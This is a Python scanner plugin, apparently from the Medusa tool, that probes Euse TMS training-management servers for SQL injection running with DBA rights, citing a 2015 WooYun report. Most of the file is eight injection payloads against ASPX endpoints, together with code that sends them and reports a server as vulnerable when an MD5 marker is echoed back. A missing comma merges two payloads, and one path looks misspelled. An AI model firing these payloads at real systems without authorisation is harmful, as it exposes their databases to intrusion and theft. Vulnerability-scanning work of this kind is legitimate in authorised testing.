#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Euse TMS存在多处DBA权限SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0135012
author: Lucifer
description: 多处存在SQL注入。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payloads = ["/euseinfo.aspx?id=1 And Sys.Fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))>0--",
            "/repoort/smartuser.aspx?di=1'And Sys.Fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))>0--",
            "/Course/allcoursecomment.aspx?type=1 And Sys.Fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))>0--",
            "/Knowledge/PersonalQuestionsList.aspx?userid=1 And Sys.Fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))>0--",
            "/Course/CourseCommentList.aspx?type=2&targetid='And Sys.Fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))>0--",
            "/Plan/plancommentlist.aspx?type=3 And Sys.Fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))>0--&targetid=1"
            "/NewPortal/download.aspx?fileid=1%27AnD%20Sys.Fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))>0%20AnD%27%%27=%27%",
            "/NewPortal/content_show.aspx?contentid=1%27AnD%20Sys.Fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))>0%20AnD%27%%27=%27%"]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    Medusas=[]
    try:
        for payload in payloads:
            payload_url = scheme+"://"+url+payload
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if  con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
                Medusa = "{} 存在Euse TMS DBA权限SQL注入\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                Medusas.append(str(Medusa))
    except Exception as e:
        pass
    return Medusas